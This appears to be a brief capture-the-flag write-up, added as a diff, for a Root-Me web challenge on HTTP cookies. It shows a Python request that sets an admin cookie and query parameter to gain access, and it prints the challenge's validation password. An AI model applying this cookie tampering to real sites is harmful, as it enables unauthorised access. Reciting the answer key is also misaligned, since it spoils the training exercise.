@@ -1,0 +1,12 @@
+WebServer Challenge 7 - HTTP Cookies
+
+Synopsis: Modify the cookies in the HTTP request to gain access.
+
+By requesting http://challenge01.root-me.org/web-serveur/ch7/?c=admin and setting a cookie of 
+ch7=admin we were able to gain access
+
+I used python:
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch7/?c=admin', cookies={'ch7':'admin'})
+>>> r.content
+'<div>Validation password : ml-SYMPA</div></fieldset>'
